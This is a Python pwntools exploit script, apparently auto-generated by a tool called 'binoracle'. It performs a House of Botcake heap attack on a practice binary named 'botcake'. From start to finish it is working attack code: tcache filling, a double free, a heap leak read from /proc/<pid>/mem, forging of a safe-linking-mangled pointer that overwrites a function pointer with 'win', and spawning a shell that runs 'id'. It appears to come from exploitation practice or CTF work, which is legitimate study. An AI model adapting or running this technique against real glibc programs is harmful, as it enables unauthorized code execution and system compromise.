#!/usr/bin/env python3
# PoC real generado por binoracle (binoracle.workflows.autobotcake._DRIVER)
# Target: samples/bin/botcake
# Uso: python3 botcake_house_of_botcake.py samples/bin/botcake
# SOLO objetivos autorizados (practica/CTF propio).
import sys, time
from pwn import ELF, context, p64, u64, process
name = sys.argv[1]
context.binary = elf = ELF(name, checksec=False); context.log_level = "error"; context.arch = "amd64"
if elf.bits != 64:
    print("NOT_APPLICABLE (botcake driver is x86-64)"); sys.exit(1)

sym = elf.symbols or {}
chunks = sym.get("chunks"); handler = sym.get("handler") or sym.get("fnptr"); win = sym.get("win")
if chunks is None or handler is None or win is None:
    print("NOT_APPLICABLE (no botcake menu shape: need chunks[]+handler+win symbols)"); sys.exit(1)

SZ = 0xf8                               # request -> 0x100 chunk (tcache bin)
io = process([name], aslr=False)        # ASLR off -> deterministic heap

def alloc(sz): io.send(b"\x01" + p64(sz)); time.sleep(0.008)
def free(i):   io.send(b"\x02" + bytes([i])); time.sleep(0.008)
def edit(i, d):io.send(b"\x03" + bytes([i]) + len(d).to_bytes(2, "little") + d); time.sleep(0.008)

try:
    for i in range(7): alloc(SZ)        # 0..6 fill
    alloc(SZ); alloc(SZ); alloc(SZ)     # 7 prev, 8 a, 9 guard
    for i in range(7): free(i)          # fill tcache[0x100]
    free(7)                             # prev -> unsorted
    free(8)                             # a -> consolidate backward -> 0x200 unsorted chunk
    alloc(SZ)                           # 10: pop one from tcache (make room)
    free(8)                             # double free: a -> tcache head (key cleared by unsorted)
    time.sleep(0.04)
    with open("/proc/%d/mem" % io.pid, "rb", 0) as mem:
        mem.seek(chunks + 8 * 8); a = u64(mem.read(8))
    mangled = handler ^ (a >> 12)       # safe-linking (glibc >= 2.32)
    alloc(0x108)                        # 11 (d): carve from unsorted, OVERLAPS a
    edit(11, b"A" * 0xf0 + p64(0) + p64(0x101) + p64(mangled))   # forge a.fd = handler
    alloc(SZ)                           # 12: pops a
    alloc(SZ)                           # 13: pops handler -> chunks[13] = &handler
    edit(13, p64(win))                  # handler = win
    io.send(b"\x04")                    # call handler -> shell
    time.sleep(0.3)
    MARK = b"BINORACLE_BOTCAKE_PWNED"
    io.sendline(b"echo " + MARK + b"; id"); time.sleep(0.35)
    out = b""
    try: out = io.recvrepeat(1.1)
    except Exception: pass
    io.close()
    if MARK in out or b"uid=" in out:
        print("VERIFIED a=%#x handler=%#x win=%#x" % (a, handler, win)); sys.exit(0)
except Exception as e:
    try: io.close()
    except Exception: pass
    print("ERROR %s" % e.__class__.__name__); sys.exit(1)
print("NOT_VERIFIED")
sys.exit(1)
